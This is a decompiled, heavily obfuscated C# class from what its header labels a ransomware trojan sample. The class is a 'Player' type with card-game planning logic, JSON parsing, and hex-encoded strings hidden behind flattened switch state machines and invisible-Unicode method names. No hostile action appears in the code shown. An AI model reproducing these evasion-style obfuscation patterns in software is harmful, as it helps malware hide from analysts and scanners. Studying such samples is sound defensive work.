// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ResourceTypeCo, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: D98D3237-A321-4821-9049-807D7FD195EE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2bf24741d28e493dd3c0fabc7478edccab0bc3835b2648c09ba153c94c065f3c.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 463085591;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 530285295)) % 11U)
        {
          case 0:
            str1 = "4E756C6C54797065496E";
            num1 = (int) num2 * -2117190567 ^ 1363895869;
            continue;
          case 1:
            num1 = (int) num2 * 82672159 ^ 1281856870;
            continue;
          case 2:
            int num3 = !flag ? 1995130413 : (num3 = 420611382);
            num1 = num3 ^ (int) num2 * -991478958;
            continue;
          case 3:
            str1 = "52344E5461";
            num1 = (int) num2 * 1685616933 ^ -1897029569;
            continue;
          case 4:
            str1 = (string) null;
            num1 = (int) num2 * 1398076458 ^ 148864120;
            continue;
          case 5:
            goto label_1;
          case 7:
            int num4 = BaseStream == 0 ? -1428568032 : (num4 = -196889290);
            num1 = num4 ^ (int) num2 * 1678440766;
            continue;
          case 8:
            num1 = (int) num2 * 7870659 ^ 1201644202;
            continue;
          case 9:
            flag = BaseStream == 1;
            num1 = 1393114654;
            continue;
          case 10:
            str2 = str1;
            num1 = 1922547150;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1630681228;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -1708985058)) % 5U)
        {
          case 0:
            num1 = (int) num3 * 919768893 ^ 2117449695;
            continue;
          case 2:
            goto label_1;
          case 3:
            num4 = 0;
            break;
          case 4:
            if (this.PlanningCards.Length != 0)
            {
              num4 = this.PlanningCards[cardTypeIndex];
              break;
            }
            num1 = (int) num3 * -589065322 ^ -1419431535;
            continue;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -295751991;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 397833746;
        int num3;
        bool flag;
        int planningCardsCount;
        int index;
        int[] planningCards;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 485733621)) % 14U)
          {
            case 0:
              planningCardsCount = num1;
              num2 = (int) num4 * -1073204927 ^ 4306486;
              continue;
            case 1:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * 350725952 ^ 911933060;
              continue;
            case 2:
              ++index;
              num2 = 603607191;
              continue;
            case 3:
              index = 0;
              num2 = (int) num4 * 1416225783 ^ -1211536852;
              continue;
            case 4:
              num2 = (int) num4 * -726416186 ^ 930130259;
              continue;
            case 5:
              int num5 = !flag ? -1388376783 : (num5 = -992617520);
              num2 = num5 ^ (int) num4 * 1419304272;
              continue;
            case 6:
              int num6;
              num2 = num6 = index >= planningCards.Length ? 1631208433 : (num6 = 1262276154);
              continue;
            case 7:
              goto label_1;
            case 8:
              num2 = (int) num4 * 565994100 ^ 1135162639;
              continue;
            case 9:
              ++num1;
              num2 = (int) num4 * 2140026457 ^ -829089204;
              continue;
            case 10:
              flag = num3 > 0;
              num2 = (int) num4 * 1435262453 ^ -1610024206;
              continue;
            case 11:
              num2 = (int) num4 * 796498379 ^ 903805274;
              continue;
            case 13:
              num3 = planningCards[index];
              num2 = 371557595;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 1253487257;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1290371543)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 934542317 ^ -1383763558;
            continue;
          case 2:
            num1 = (int) num2 * 1239250929 ^ -1821424032;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -1639603562;
      bool flag1;
      int index;
      string str1;
      int planningCard;
      string str2;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -516975952)) % 15U)
        {
          case 0:
            str1 = Player.\u200E‬‪‭‫‫‬⁮‬‫‬⁭‏⁪‏⁭⁫‌‌‫‍⁭​‭‮⁪‮⁫‮⁬‫‬‮‮‌‍‫‬‎‎‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1927957008;
            continue;
          case 1:
            flag1 = index < this.PlanningCards.Length;
            num1 = -2091083424;
            continue;
          case 2:
            str2 = str1;
            num1 = (int) num2 * -277766472 ^ 955018548;
            continue;
          case 3:
            num1 = -2077174640;
            continue;
          case 4:
            str1 = " ";
            num1 = (int) num2 * 460389206 ^ 1845815622;
            continue;
          case 5:
            num1 = (int) num2 * -506419172 ^ -689605318;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = (int) num2 * 762924355 ^ 713051149;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            flag2 = planningCard == 0;
            num1 = (int) num2 * 997441251 ^ 1095638258;
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * -932782657 ^ 1835612124;
            continue;
          case 11:
            ++index;
            num1 = -1904947822;
            continue;
          case 12:
            int num3 = flag1 ? 1361474677 : (num3 = 1714803024);
            num1 = num3 ^ (int) num2 * -1966267351;
            continue;
          case 13:
            int num4 = !flag2 ? 1848523501 : (num4 = 155693224);
            num1 = num4 ^ (int) num2 * -486754410;
            continue;
          case 14:
            num1 = (int) num2 * -658940224 ^ 958550225;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1567520021;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1759527945)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1343827495 ^ 1651524353;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 453093981;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      int count;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1431673297)) % 12U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1111948918;
            continue;
          case 1:
            int num3 = flag ? -793657085 : (num3 = -233312178);
            num1 = num3 ^ (int) num2 * 1318729430;
            continue;
          case 2:
            num1 = (int) num2 * -1095810163 ^ -230624446;
            continue;
          case 3:
            ++aIndex;
            num1 = (int) num2 * -887771747 ^ 1466141111;
            continue;
          case 5:
            flag = aIndex < count;
            num1 = 1559855576;
            continue;
          case 6:
            num1 = (int) num2 * -1481714064 ^ 1480975141;
            continue;
          case 7:
            goto label_1;
          case 8:
            count = json.Count;
            num1 = (int) num2 * 2002699064 ^ 2040537411;
            continue;
          case 9:
            planningCards = numArray;
            num1 = (int) num2 * 1849062024 ^ -669219817;
            continue;
          case 10:
            numArray = new int[count];
            num1 = (int) num2 * -1415675806 ^ 193206310;
            continue;
          case 11:
            aIndex = 0;
            num1 = (int) num2 * -1578728882 ^ -919680755;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 660291162;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1280008063)) % 4U)
        {
          case 1:
            str = Player.\u206E‫⁮⁮‮⁯‮‎‍‪‪​⁫⁫⁬‭⁮‪⁪‎⁫⁮⁬‮‍‬‮‍‌‌‎⁬‍​​⁯⁭‪⁮‬‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 599735333 ^ -1512990103;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -252431239 ^ -667479252;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200E‬‪‭‫‫‬⁮‬‫‬⁭‏⁪‏⁭⁫‌‌‫‍⁭​‭‮⁪‮⁫‮⁬‫‬‮‮‌‍‫‬‎‎‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206E‫⁮⁮‮⁯‮‎‍‪‪​⁫⁫⁬‭⁮‪⁪‎⁫⁮⁬‮‍‬‮‍‌‌‎⁬‍​​⁯⁭‪⁮‬‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
